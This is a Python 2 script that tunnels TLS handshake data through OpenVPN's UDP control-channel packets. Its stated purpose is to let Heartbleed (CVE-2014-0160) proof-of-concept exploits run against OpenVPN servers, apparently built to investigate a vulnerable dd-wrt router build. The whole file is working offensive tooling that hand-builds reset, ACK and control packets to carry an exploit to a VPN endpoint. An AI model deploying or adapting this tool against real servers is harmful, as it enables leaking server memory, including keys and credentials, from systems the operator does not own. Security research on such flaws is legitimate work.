#!/usr/bin/python

# Script to multiplex heartbleed (CVE-2014-0160) POCs against OpenVPN
# Built by Tommy Murphy (@tam7t) to investigate vulnerable dd-wrt build
# http://www.dd-wrt.com/phpBB2/viewtopic.php?t=260167
#
# OpenVPN protocol references included:
#   * https://openvpn.net/index.php/open-source/documentation/security-overview.html
#   * http://wiki.wireshark.org/OpenVPN
#
# Limitations:
#   * OpenVPN UDP only
#   * implementing --tls-auth would prevent this (that would require HMAC'ing of messages)
#   * time_t timestamp not implemented (part of packet-id)
#   * no reliability layer (ignores acks/doesn't retransmit) 
#   * key id parameter fixed to 0 (bottom 3 bits of OpenVPN opcode)

from optparse import OptionParser
import socket
import select
import os
import struct

options = OptionParser(usage='%prog server [options]', description='OpenVPN multiplexer for SSL handshakes')
options.add_option('-p', '--local-port', type='int', default=443, help='Local listening port (default: 443)')
options.add_option('-d', '--dest-port', type='int', default=1194, help='OpenVPN server port (default: 1194)')

########################################################
# client                                          server
# START SESSION
#        ---P_CONTROL_HARD_RESET_CLIENT_V2 ---->
#        <--P_CONTROL_HARD_RESET_SERVER_V2------
#        ---P_ACK_V1 (server reset)------------>
# TLS HELLO'S
#        ---P_CONTROL_V1 (TLS hello, frag'ed)-->
#        <--P_ACK_v1 (TLS hello frag's)---------
#        <--P_CONTROL_V1 (TLS hello, frag'ed)---
#        ---P_ACK_v1 (TLS hello frag's)-------->
# TLS RECORD LAYER
#        ---P_CONTROL_V1 (TLS record layer)---->
#        <--P_ACK_v1 (TLS record frag's)--------
#        <--P_CONTROL_V1 (TLS record layer)-----
#        ---P_ACK_v1 (TLS record frag's)------->
#....
# TLS Application DATA (part of P_CONTROL_V1)
# P_DATA_V1 is then used with actual data
########################################################

def build_reset_client_v2(state):
    # build a P_CONTROL_HARD_RESET_CLIENT_V2 packet
    packet = '\x38'
    packet += state['session-id']
    # HMAC would go here
    # packet += struct.pack('>L',state['packet-id'])
    # struct.pack('>L',int(time.time())) for current time
    packet += '\x00' # message packet id array length (for ack'ing)
    packet += struct.pack('>L',state['message-packet-id'])
    return packet

def build_ack_v1(state):
    # build P_ACK_V1 packet
    # P_ACK_V1
    #    OPCODE (1 byte) [0x28]
    #    Session ID (8 bytes)
    #    Packet-ID (4 bytes)
    #    Message Packet-ID Array Length (1 byte)
    #        Acknowledged Message Packet-ID (4 bytes)
    #    Remote Session ID (8 bytes)
    packet = '\x28'
    packet += state['session-id']
    # HMAC would go here
    # state['packet-id'] += 1
    # packet += struct.pack('>L',state['packet-id'])
    # struct.pack('>L',int(time.time())) for current time
    packet += '\x01' # message packet id array length (for ack'ing)
    rid = state['received-ids'].pop()
    packet += rid
    packet += state['remote-session-id']
    return packet

def build_control_v1(state, data):
    # build P_CONTROL_V1 packet
    # P_CONTROL
    #    OPCODE (1 byte)
    #    Session ID (8 bytes)
    #    HMAC (not used)
    #    Packet-ID (4 bytes, count up each time)
    #    Message Packet-ID Array Length (1 byte)
    #        Acknowledged Message Packet-ID (4 bytes)
    #    Message Packet-ID (4 bytes, from actual message)
    #    Message Fragement (up to 100 bytes)
    packet = '\x20'
    packet += state['session-id']
    # HMAC would go here
    # state['packet-id'] += 1
    # packet += struct.pack('>L',state['packet-id'])
    # struct.pack('>L',int(time.time())) for current time
    packet += '\x00' # message packet id array length (for ack'ing)
    state['message-packet-id'] += 1
    packet += struct.pack('>L',state['message-packet-id'])
    packet += data
    return packet

def parse_vpn_packet(state, packet):
    if packet[0] == '\x40':
        # P_CONTROL_HARD_RESET_SERVER_V2
        state['remote-session-id'] = packet[1:9]
        mid = packet[len(packet)-4:]
        if (struct.unpack('>L', mid)[0] >= state['highest-rec-id']):
            state['received-ids'].append(mid)
            state['highest-rec-id'] = struct.unpack('>L', mid)[0]
        print 'vpn-recv: P_CONTROL_HARD_RESET_SERVER_V2'
        # would also need to keep track of packet-id array to retransmit
    elif packet[0] == '\x28':
        # P_ACK_V1
        # would also need to keep track of packet-id array to retransmit
        print 'vpn-recv: ack - ignoring'
    elif packet[0] == '\x20':
        # P_CONTROL_V1
        sid_index = packet.find(state['session-id'])

        if sid_index > 0:
            mid = packet[sid_index+8:sid_index+12]
            data = packet[sid_index+12:]
        else:
            mid = packet[10:14]
            data = packet[14:]

        if (struct.unpack('>L', mid)[0] > state['highest-rec-id']):
            state['received-ids'].append(mid)
            state['highest-rec-id'] = struct.unpack('>L', mid)[0]
            return data
        return None
    else:
        # don't handle other stuff
        print 'vpn-recv: bad opcode'
    return None

def main():
    opts, args = options.parse_args()
    if len(args) < 1:
        options.print_help()
        return

    # listen for incoming TCP connection
    tcp_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    tcp_server.bind(('127.0.0.1', opts.local_port))
    tcp_server.listen(1)
    print 'Listening for connections...'

    tcp_conn, addr = tcp_server.accept()
    print 'Connection address:', addr
    tcp_server.close()

    # connection made, build socket to OpenVPN server
    udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    # initiate OpenVPN protocol state
    vpn_state = {}
    vpn_state['ip'] = args[0]
    vpn_state['port'] = opts.dest_port
    vpn_state['session-id'] = os.urandom(8)
    vpn_state['packet-id'] = 1
    vpn_state['message-packet-id'] = 0
    vpn_state['received-ids'] = []
    vpn_state['highest-rec-id'] = 0

    # send initial client reset message 
    m = build_reset_client_v2(vpn_state)
    udp_socket.sendto(m, (vpn_state['ip'], vpn_state['port']))
    print 'Connecting to:', vpn_state['ip']

    # block on receiving server response
    data, addr = udp_socket.recvfrom(1024)
    parse_vpn_packet(vpn_state, data)
    print 'Connected.'

    # udp message id
    mid = 0

    while True:
        try:
            # send any pending ack's
            while len(vpn_state['received-ids']) > 0:
                m = build_ack_v1(vpn_state)
                udp_socket.sendto(m, (vpn_state['ip'], vpn_state['port']))

            # any sockets ready to receive info?
            ir,otr,xr = select.select([tcp_conn, udp_socket],[],[])
            socket_closed = False
            for s in ir:
                if s == tcp_conn:
                    # data ready to read on TCP socket - forward to UDP
                    data = tcp_conn.recv(1024)
                    if not data:
                        socket_closed = True
                    for i in range(0, len(data), 100):
                        m = build_control_v1(vpn_state, data[i:i+100])
                        udp_socket.sendto(m, (vpn_state['ip'], vpn_state['port']))
                elif s == udp_socket:
                    # data ready to read on UDP socket - forward to TCP
                    data, addr = udp_socket.recvfrom(1024)
                    m = parse_vpn_packet(vpn_state, data)
                    if m is not None:
                        tcp_conn.send(m)
            if socket_closed: break
        except Exception, e:
            break

    print 'Bye bye.'
    tcp_conn.close()
    udp_socket.close()
    exit()

if __name__ == '__main__':
    main()
